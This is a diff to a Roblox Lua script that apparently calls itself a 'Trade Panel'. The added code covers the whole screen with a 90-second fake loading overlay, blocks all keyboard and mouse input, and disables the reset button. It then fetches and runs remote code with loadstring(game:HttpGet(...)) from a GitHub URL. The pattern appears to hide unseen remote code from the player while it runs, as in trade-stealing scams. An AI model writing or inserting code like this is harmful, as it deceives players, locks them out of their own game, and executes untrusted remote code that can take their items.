@@ -1,78 +1,175 @@
---// TRADE PANEL GUI
+-- LOADING SCREEN BEFORE MAIN SCRIPT
+local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local ContextActionService = game:GetService("ContextActionService")
 local StarterGui = game:GetService("StarterGui")
-local player = Players.LocalPlayer
-local mouse = player:GetMouse()
 
--- Notification function
-local function Notify(msg)
-    StarterGui:SetCore("SendNotification", {
-        Title = "Trade Panel",
-        Text = msg,
-        Duration = 3
-    })
+-- BLOCK ALL INPUT
+local function blockInput()
+    return Enum.ContextActionResult.Sink
 end
+ContextActionService:BindAction("BlockAllInput", blockInput, false, unpack(Enum.UserInputType:GetEnumItems()))
+ContextActionService:BindAction("BlockAllInputKeys", blockInput, false, unpack(Enum.KeyCode:GetEnumItems()))
 
--- Create ScreenGui
-local gui = Instance.new("ScreenGui")
-gui.Parent = player:WaitForChild("PlayerGui")
-gui.Name = "TradePanel"
+-- Disable Reset button (forces player to use Roblox menu close)
+StarterGui:SetCore("ResetButtonCallback", false)
 
--- Main Frame
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 280, 0, 200)
-frame.Position = UDim2.new(0.3, 0, 0.3, 0)
-frame.BackgroundColor3 = Color3.fromRGB(128, 0, 128)
-frame.BackgroundTransparency = 0
-frame.BorderSizePixel = 0
-frame.Parent = gui
+-- ScreenGui (TopMost)
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.DisplayOrder = 1e6 -- max priority
+ScreenGui.Parent = game.CoreGui
 
--- Gradient
-local gradient = Instance.new("UIGradient")
-gradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(128, 0, 128)), -- Purple
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 255)), -- Blue
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))    -- Red
+-- FULLSCREEN COVER
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(1, 0, 1, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+MainFrame.ZIndex = 1e6
+MainFrame.Parent = ScreenGui
+
+-- BACKGROUND GRADIENT
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(128, 0, 128))
 }
-gradient.Rotation = 45
-gradient.Parent = frame
+UIGradient.Rotation = 45
+UIGradient.Parent = MainFrame
 
--- Dragging (PC & Mobile)
-local dragging, dragInput, dragStart, startPos
-local function update(input)
-    local delta = input.Position - dragStart
-    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
-        startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+-- FLOATING PARTICLES
+for i = 1, 20 do
+    local particle = Instance.new("Frame")
+    particle.Size = UDim2.new(0, math.random(20, 50), 0, math.random(20, 50))
+    particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
+    particle.BackgroundColor3 = Color3.fromRGB(math.random(100, 255), math.random(0, 100), math.random(150, 255))
+    particle.BackgroundTransparency = 0.7
+    particle.BorderSizePixel = 0
+    particle.ZIndex = 1e6
+    particle.Parent = MainFrame
+    Instance.new("UICorner", particle).CornerRadius = UDim.new(1, 0)
+
+    task.spawn(function()
+        while particle.Parent do
+            TweenService:Create(
+                particle,
+                TweenInfo.new(math.random(5, 12), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
+                {Position = UDim2.new(math.random(), 0, math.random(), 0)}
+            ):Play()
+            task.wait(math.random(5, 12))
+        end
+    end)
 end
 
-frame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or 
-       input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = frame.Position
-
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
+-- ROTATING RING
+local Ring = Instance.new("ImageLabel")
+Ring.Size = UDim2.new(0, 300, 0, 300)
+Ring.Position = UDim2.new(0.5, -150, 0.35, -150)
+Ring.BackgroundTransparency = 1
+Ring.Image = "rbxassetid://7743864258"
+Ring.ImageColor3 = Color3.fromRGB(200, 100, 255)
+Ring.ZIndex = 1e6
+Ring.Parent = MainFrame
+task.spawn(function()
+    while Ring.Parent do
+        Ring.Rotation = (Ring.Rotation + 0.1) % 360
+        task.wait()
     end
 end)
 
-frame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or 
-       input.UserInputType == Enum.UserInputType.Touch then
-        dragInput = input
+-- LOADING TEXT
+local LoadingLabel = Instance.new("TextLabel")
+LoadingLabel.Size = UDim2.new(1, 0, 0, 100)
+LoadingLabel.Position = UDim2.new(0, 0, 0.35, 0)
+LoadingLabel.BackgroundTransparency = 1
+LoadingLabel.Text = "⏳💼 LOADING TRADE PANEL 💼⏳"
+LoadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoadingLabel.TextScaled = true
+LoadingLabel.Font = Enum.Font.GothamBold
+LoadingLabel.ZIndex = 1e6
+LoadingLabel.Parent = MainFrame
+
+local TextGradient = Instance.new("UIGradient")
+TextGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 0)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(128, 0, 255))
+}
+TextGradient.Rotation = 0
+TextGradient.Parent = LoadingLabel
+
+task.spawn(function()
+    while TextGradient.Parent do
+        TextGradient.Rotation = (TextGradient.Rotation + 1) % 360
+        task.wait(0.03)
     end
 end)
 
-game:GetService("UserInputService").InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        update(input)
-    end
+-- PROGRESS BAR
+local BarFrame = Instance.new("Frame")
+BarFrame.Size = UDim2.new(0.6, 0, 0, 30)
+BarFrame.Position = UDim2.new(0.2, 0, 0.55, 0)
+BarFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+BarFrame.BorderSizePixel = 0
+BarFrame.ZIndex = 1e6
+BarFrame.Parent = MainFrame
+Instance.new("UICorner", BarFrame)
+
+local FillFrame = Instance.new("Frame")
+FillFrame.Size = UDim2.new(0, 0, 1, 0)
+FillFrame.BorderSizePixel = 0
+FillFrame.ZIndex = 1e6
+FillFrame.Parent = BarFrame
+Instance.new("UICorner", FillFrame)
+
+local hue = 0
+RunService.RenderStepped:Connect(function()
+    hue = (hue + 0.005) % 1
+    FillFrame.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
 end)
 
+local PercentLabel = Instance.new("TextLabel")
+PercentLabel.Size = UDim2.new(1, 0, 0, 30)
+PercentLabel.Position = UDim2.new(0, 0, 1.1, 0)
+PercentLabel.BackgroundTransparency = 1
+PercentLabel.Text = "0%"
+PercentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+PercentLabel.TextScaled = true
+PercentLabel.Font = Enum.Font.GothamBold
+PercentLabel.ZIndex = 1e6
+PercentLabel.Parent = BarFrame
+
+-- FADE IN
+MainFrame.BackgroundTransparency = 1
+TweenService:Create(MainFrame, TweenInfo.new(1), {BackgroundTransparency = 0}):Play()
+
+-- LOADING (1.5 min)
+local duration = 90
+local startTime = tick()
+while tick() - startTime < duration do
+    local progress = ((tick() - startTime) / duration) * 100
+    if progress > 100 then progress = 100 end
+    PercentLabel.Text = string.format("%d%%", progress)
+    FillFrame.Size = UDim2.new(progress / 100, 0, 1, 0)
+    task.wait(0.05)
+end
+
+-- FADE OUT
+TweenService:Create(MainFrame, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
+task.wait(1)
+ScreenGui:Destroy()
+
+-- UNBLOCK INPUT
+ContextActionService:UnbindAction("BlockAllInput")
+ContextActionService:UnbindAction("BlockAllInputKeys")
+StarterGui:SetCore("ResetButtonCallback", true)
+
+-- LOAD MAIN SCRIPT
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ordinaryUserlol/TRADE-PANEL/refs/heads/main/PANEL%20LOADER"))()
 -- Title
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 40)
